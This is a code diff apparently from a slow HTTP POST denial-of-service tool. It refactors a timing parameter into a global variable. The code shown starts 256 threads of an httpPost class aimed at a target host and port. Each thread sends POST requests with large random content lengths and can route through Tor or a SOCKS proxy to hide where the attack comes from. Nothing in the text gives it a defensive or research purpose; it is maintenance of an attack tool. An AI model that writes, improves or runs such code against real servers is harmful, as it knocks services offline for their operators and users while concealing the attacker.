@@ -30,6 +30,7 @@ term = terminal.TerminalController()
 global presleepbetweenthreadstart
 presleepbetweenthreadstart = None
 
+global maxsecondsbetweenpacket
 
 useragents = [
     "curl/7.85.0"
@@ -340,7 +341,7 @@ useragents = [
 
 
 class httpPost(Thread):
-    def __init__(self, threadid, host, port, tor, sockshost, socksport, maxsecondsbetweenpacket):
+    def __init__(self, threadid, host, port, tor, sockshost, socksport):
         Thread.__init__(self)
         self.threadid = threadid
         self.host = host
@@ -349,12 +350,12 @@ class httpPost(Thread):
         self.tor = tor
         self.sockshost = sockshost
         self.socksport = socksport
-        self.maxsecondsbetweenpacket = maxsecondsbetweenpacket
         self.running = True
         self.sentcount = 0
 
     def _send_http_post(self, pause=10):
         global stop_now
+        global maxsecondsbetweenpacket
 
         contentlength = random.randint(10000, 30000)
 
@@ -440,6 +441,7 @@ def main(argv):
 
     global stop_now
     global presleepbetweenthreadstart
+    global maxsecondsbetweenpacket
 
     target = ''
     threads = 256
@@ -485,7 +487,7 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(i, target, port, tor, sockshost, socksport, maxsecondsbetweenpacket)
+        t = httpPost(i, target, port, tor, sockshost, socksport)
         rthreads.append(t)
         t.start()
         if presleepbetweenthreadstart:
